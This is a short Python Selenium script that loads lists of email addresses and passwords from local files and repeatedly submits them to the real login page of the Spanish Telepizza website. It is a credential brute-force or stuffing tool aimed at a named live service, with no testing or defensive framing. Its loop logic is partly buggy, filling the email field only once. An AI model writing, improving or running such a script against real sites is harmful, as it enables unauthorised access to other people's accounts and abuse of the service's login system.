import string, random, time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from ctypes import sizeof
ubicacionDriver = '/usr/local/bin/chromedriver'

def readUsuarios():
    usuarios = list()
    arc = open("user.txt")
    lineas = arc.readlines()
    i = 0    #driver.get('https://www.telepizza.es/')
    for lineas in lineas:
        usuarios.append(lineas)
    return usuarios

def readPasswords():
    passwords = list()
    arc = open("pass.txt")
    lineas = arc.readlines()
    i = 0
    for lineas in lineas:
        passwords.append(lineas)
    return passwords


if __name__ == "__main__":
    options = webdriver.ChromeOptions()
    options.add_argument('--start-maximized')
    options.add_argument('--disable-extensions')

    driver = webdriver.Chrome(ubicacionDriver, chrome_options=options)
    correos=readUsuarios()
    contraseñas=readPasswords()
    driver.set_window_position(1000,0)
    driver.maximize_window()
    time.sleep(1)
    driver.get('https://www.telepizza.es/account/login')
    time.sleep(2)
    driver.find_element(By.XPATH,'//*[@id="cookie-alert"]/div/div[2]/button').click()
    i = 0
    time.sleep(2)
    
    for contraseña in contraseñas:
        for correo in correos:

            if i == 0:
                email = driver.find_element(By.ID, 'UserName')
                email.clear()
                email.send_keys(correo)
                time.sleep(5)
                i = i + 1 
            
            passw = driver.find_element(By.ID,"Password")
            passw.clear()
            passw.send_keys(contraseña)
            time.sleep(5)
            
            driver.find_element(By.ID, "login-submit").click()
            time.sleep(2)
    driver.close()